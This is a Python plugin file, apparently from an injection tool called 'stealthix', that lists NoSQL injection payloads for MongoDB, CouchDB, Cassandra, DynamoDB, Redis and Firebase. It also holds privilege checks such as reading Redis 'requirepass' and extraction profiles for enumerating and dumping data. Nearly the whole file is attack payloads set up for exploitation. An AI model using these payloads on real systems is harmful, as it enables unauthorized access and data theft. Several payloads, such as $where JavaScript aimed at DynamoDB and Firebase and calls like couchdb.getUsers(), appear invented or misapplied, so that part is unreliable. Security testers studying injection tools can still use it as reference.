from __future__ import annotations

from stealthix.plugins.base import Plugin
from stealthix.plugins.nosql.document import DOCUMENT_PLUGINS
from stealthix.plugins.nosql.graph import GRAPH_PLUGINS
from stealthix.plugins.nosql.keyvalue import KEYVALUE_PLUGINS
from stealthix.plugins.nosql.multimodel import MULTIMODEL_PLUGINS
from stealthix.plugins.nosql.search import SEARCH_PLUGINS
from stealthix.plugins.nosql.timeseries import TIMESERIES_PLUGINS

NOSQL_PLUGINS = [
    Plugin(
        "mongodb",
        "nosql",
        dbms="mongodb",
        payloads=['{"$ne": null}', '{"$where": "sleep(3000)"}'],
        fingerprints=["mongodb", "bson"],
        error_signatures=["mongodb", "bson"],
        version_queries=[
            '{"$where":"return db.version()"}',
            '{"$where":"return db.getMongo().version()"}',
        ],
        privilege_checks=[
            '{"$where":"return db.getUsers()"}',
            '{"$where":"return db.getCollectionNames()"}',
        ],
        os_queries=['{"$where":"return db.serverStatus().os"}'],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": [
                    '{"$where":"return db.getMongo().getDBNames().join(",")"}',
                    '{"$where":"return db.getName()"}',
                ],
                "patterns": [r"\bdatabase[:=\s]+([a-z0-9_\-]+)", r"\bdb[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": [
                    '{"$where":"return db.getCollectionNames().join(",")"}',
                    '{"$aggregate": [{"$listCollections": {}}]}',
                ],
                "patterns": [r"\bcollection[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": [
                    '{"$where":"return Object.keys(this).join(",")"}',
                    '{"$project": {"keys": {"$objectToArray": "$$ROOT"}}}',
                ],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ['{"$where":"return true"}', '{"$regex":".*"}', '{"$ne":null}'],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "couchdb",
        "nosql",
        dbms="couchdb",
        payloads=['{"$or": [{"_id": null}, {"_id": {"$gt": ""}}]}', '{"$where": "sleep(3000)"}'],
        fingerprints=["couchdb"],
        error_signatures=["couch", "missing"],
        version_queries=['{"$where":"return couchdb.version()"}'],
        privilege_checks=['{"$where":"return couchdb.getUsers()"}'],
        os_queries=['{"$where":"return couchdb.osInfo()"}'],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ["_all_dbs"],
                "patterns": [r"\bdatabase[:=\s]+([a-z0-9_\-]+)", r"\bdb[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ["_all_docs", "_find"],
                "patterns": [r"\btable[:=\s]+([a-z0-9_\-]+)", r"\bcollection[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": ["_all_docs?include_docs=true"],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bkey[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ["_find", "_all_docs?include_docs=true"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "cassandra",
        "nosql",
        dbms="cassandra",
        payloads=["' OR '1'='1", "' OR token(id) > token(0)-- "],
        fingerprints=["cassandra", "cql"],
        error_signatures=["cassandra", "com.datastax", "cql"],
        version_queries=[
            "SELECT release_version FROM system.local",
            "SELECT version() FROM system.local",
        ],
        privilege_checks=[
            "SELECT role FROM system_auth.roles WHERE role='admin'",
            "SELECT * FROM system_auth.role_permissions",
        ],
        os_queries=["SELECT * FROM system.peers"],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": [
                    "DESCRIBE KEYSPACES",
                    "SELECT keyspace_name FROM system_schema.keyspaces",
                ],
                "patterns": [
                    r"\bkeyspace[:=\s]+([a-z0-9_\-]+)",
                    r"\bdatabase[:=\s]+([a-z0-9_\-]+)",
                ],
            },
            "tables": {
                "payloads": ["DESCRIBE TABLES", "SELECT table_name FROM system_schema.tables"],
                "patterns": [r"\btable[:=\s]+([a-z0-9_\-]+)", r"\bcollection[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": ["DESCRIBE", "SELECT column_name FROM system_schema.columns"],
                "patterns": [r"\bcolumn[:=\s]+([a-z0-9_\-]+)", r"\bfield[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ["SELECT * FROM", "SELECT * FROM system_schema.tables"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "dynamodb",
        "nosql",
        dbms="dynamodb",
        payloads=['{"$ne": ""}', '{"$regex": ".*"}'],
        fingerprints=["dynamodb"],
        error_signatures=["dynamodb", "validationexception"],
        version_queries=['{"$where":"return db.version()"}'],
        privilege_checks=['{"$where":"return db.getUsers()"}'],
        os_queries=['{"$where":"return db.serverStatus().os"}'],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ["ListTables"],
                "patterns": [r"\bdatabase[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ["ListTables", "DescribeTable"],
                "patterns": [r"\btable[:=\s]+([a-z0-9_\-]+)", r"\bcollection[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": ["DescribeTable"],
                "patterns": [r"\bcolumn[:=\s]+([a-z0-9_\-]+)", r"\bfield[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ["Scan", "Query"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "redis",
        "nosql",
        dbms="redis",
        payloads=["*", "%2a"],
        fingerprints=["redis"],
        error_signatures=["unknown command", "redis_version"],
        version_queries=["INFO server", "INFO"],
        privilege_checks=["INFO replication", "CONFIG GET requirepass"],
        os_queries=["INFO server"],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ["INFO", "CONFIG GET databases"],
                "patterns": [r"\bdb(\d+)", r"\bdatabase[:=\s]+(\d+)"],
            },
            "tables": {
                "payloads": ["KEYS *", "SCAN 0"],
                "patterns": [r"\bkey[:=\s]+([a-z0-9_\-:]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": ["HKEYS", "HGETALL"],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ["GET", "HGETALL", "LRANGE 0 -1"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "firebase",
        "nosql",
        dbms="firebase",
        payloads=['{"$ne": ""}', '{"$regex": ".*"}'],
        fingerprints=["firebase"],
        error_signatures=["firebase", "permission_denied"],
        version_queries=['{"$where":"return firebase.version()"}'],
        privilege_checks=['{"$where":"return firebase.getUsers()"}'],
        os_queries=['{"$where":"return firebase.serverInfo()"}'],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ["listCollections", "get"],
                "patterns": [
                    r"\bdatabase[:=\s]+([a-z0-9_\-]+)",
                    r"\bcollection[:=\s]+([a-z0-9_\-]+)",
                ],
            },
            "tables": {
                "payloads": ["listCollections", "listDocuments"],
                "patterns": [r"\bcollection[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": ["get", "listDocuments"],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ["get", "getDocs", "query"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
]

# Add plugins from category-specific files
NOSQL_PLUGINS.extend(DOCUMENT_PLUGINS)
NOSQL_PLUGINS.extend(GRAPH_PLUGINS)
NOSQL_PLUGINS.extend(SEARCH_PLUGINS)
NOSQL_PLUGINS.extend(TIMESERIES_PLUGINS)
NOSQL_PLUGINS.extend(KEYVALUE_PLUGINS)
NOSQL_PLUGINS.extend(MULTIMODEL_PLUGINS)
